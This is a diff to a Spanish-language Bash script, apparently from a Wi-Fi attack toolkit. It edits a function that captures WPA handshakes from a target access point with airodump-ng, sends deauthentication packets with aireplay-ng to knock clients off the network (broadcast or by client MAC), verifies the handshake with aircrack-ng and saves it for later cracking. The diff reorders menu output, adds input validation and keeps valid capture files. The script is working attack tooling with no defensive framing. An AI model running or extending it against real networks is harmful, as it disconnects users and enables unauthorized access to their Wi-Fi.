@@ -68,6 +68,7 @@ function capture_handshake() {
     echo -e "${YELLOW}[*] Esperando 5 segundos para que inicie la captura...${NC}"
     sleep 5
     
+    
     while true; do
         clear
         banner
@@ -76,26 +77,10 @@ function capture_handshake() {
         echo -e "  Target: ${GREEN}$default_name${NC} (${CYAN}$bssid${NC})"
         echo ""
         
-        # Indicador de estado de captura
-        echo -e "  ${CYAN}●${NC} Estado de Captura:"
-        if pgrep -f "airodump-ng.*$bssid" > /dev/null; then
-            echo -e "    ${GREEN}✓ Activa${NC} - Monitoreando tráfico..."
-        else
-            echo -e "    ${RED}✗ Inactiva${NC} - No hay captura en curso"
-        fi
-        echo ""
-        echo -e "  ${CYAN}ℹ${NC}  La ventana de captura se cierra automáticamente"
-        echo -e "     al detectar el handshake. Si no se captura,"
-        echo -e "     ejecuta un ataque de deauth."
-        echo ""
-        echo -e "  ${CYAN}1${NC}  Deauth masiva (Broadcast)"
-        echo -e "  ${CYAN}2${NC}  Deauth específica (Seleccionar cliente)"
-        echo -e "  ${CYAN}3${NC}  Volver al menú principal"
-        echo ""
-        read -p "  → Opción: " hs_opt
-        
-        # Verificar si el proceso de captura sigue activo
+        # PRIMERO: Verificar si el proceso de captura sigue activo
         if ! pgrep -f "airodump-ng.*$bssid" > /dev/null; then
+            echo -e "  ${CYAN}●${NC} Estado de Captura:"
+            echo -e "    ${RED}✗ Inactiva${NC} - La captura se detuvo"
             echo ""
             echo -e "${YELLOW}[!] La captura se detuvo.${NC}"
             echo -e "${YELLOW}[*] Verificando si se capturó el handshake...${NC}"
@@ -141,6 +126,20 @@ function capture_handshake() {
             fi
         fi
         
+        # SEGUNDO: Mostrar estado e indicadores
+        echo -e "  ${CYAN}●${NC} Estado de Captura:"
+        echo -e "    ${GREEN}✓ Activa${NC} - Monitoreando tráfico..."
+        echo ""
+        echo -e "  ${CYAN}ℹ${NC}  La ventana de captura se cierra automáticamente"
+        echo -e "     al detectar el handshake. Si no se captura,"
+        echo -e "     ejecuta un ataque de deauth."
+        echo ""
+        echo -e "  ${CYAN}1${NC}  Deauth masiva (Broadcast)"
+        echo -e "  ${CYAN}2${NC}  Deauth específica (Seleccionar cliente)"
+        echo -e "  ${CYAN}3${NC}  Volver al menú principal"
+        echo ""
+        read -p "  → Opción: " hs_opt
+        
         case $hs_opt in
             1)
                 echo -e "${RED}[ATTACK] Enviando 10 paquetes de deauth (Broadcast)...${NC}"
@@ -180,21 +179,59 @@ function capture_handshake() {
                     else
                         echo ""
                         read -p "Cliente a atacar (número): " c_sel
-                        if [[ "$c_sel" -gt 0 && "$c_sel" -le "$count" ]]; then
+                        # Validar que sea un número
+                        if [[ "$c_sel" =~ ^[0-9]+$ ]] && [[ "$c_sel" -gt 0 ]] && [[ "$c_sel" -le "$count" ]]; then
                             target_client="${client_macs[$c_sel]}"
                             echo -e "${RED}[ATTACK] Enviando 10 paquetes a $target_client...${NC}"
                             aireplay-ng -0 10 -a "$bssid" -c "$target_client" "$mon_interface"
                         else
-                            echo -e "${RED}[!] Selección inválida.${NC}"
+                            echo -e "${RED}[!] Selección inválida. Debe ser un número entre 1 y $count${NC}"
                         fi
                     fi
                 fi
                 read -p "Presiona Enter para continuar..."
                 ;;
             3)
+                # Verificar si hay handshake antes de eliminar
+                cap_to_check=""
+                if [ -f "${full_cap_path}-01.cap" ]; then
+                    cap_to_check="${full_cap_path}-01.cap"
+                elif [ -f "${full_cap_path}.cap" ]; then
+                    cap_to_check="${full_cap_path}.cap"
+                fi
+                
+                # Matar proceso de captura
                 pkill -f "airodump-ng.*$bssid"
-                echo -e "${YELLOW}[*] Eliminando archivos de captura incompletos...${NC}"
-                rm -f "${full_cap_path}"*
+                
+                # Verificar si hay handshake válido
+                if [ ! -z "$cap_to_check" ] && [ -s "$cap_to_check" ]; then
+                    if timeout 10 aircrack-ng -b "$bssid" "$cap_to_check" 2>&1 | grep -q "1 handshake"; then
+                        echo ""
+                        echo -e "${GREEN}[!!!] Se detectó un handshake válido en el archivo${NC}"
+                        read -p "¿Deseas guardar el archivo? (s/n): " save_file
+                        if [[ "$save_file" == "s" || "$save_file" == "S" ]]; then
+                            # Renombrar archivo final
+                            if [[ "$cap_to_check" != "${full_cap_path}.cap" ]]; then
+                                mv "$cap_to_check" "${full_cap_path}.cap"
+                                cap_to_check="${full_cap_path}.cap"
+                            fi
+                            echo -e "${GREEN}[+] Archivo guardado en: $cap_to_check${NC}"
+                            export HANDSHAKE_CAPTURED=1
+                            
+                            # Limpiar solo archivos auxiliares (csv, netxml, kismet)
+                            rm -f "${full_cap_path}"-*.csv "${full_cap_path}"-*.kismet.csv "${full_cap_path}"-*.kismet.netxml "${full_cap_path}"-*.log.csv
+                        else
+                            echo -e "${YELLOW}[*] Eliminando todos los archivos de captura...${NC}"
+                            rm -f "${full_cap_path}"*
+                        fi
+                    else
+                        echo -e "${YELLOW}[*] No se detectó handshake. Eliminando archivos incompletos...${NC}"
+                        rm -f "${full_cap_path}"*
+                    fi
+                else
+                    echo -e "${YELLOW}[*] Eliminando archivos de captura...${NC}"
+                    rm -f "${full_cap_path}"*
+                fi
                 return
                 ;;
             *) echo "Opción inválida." ;;
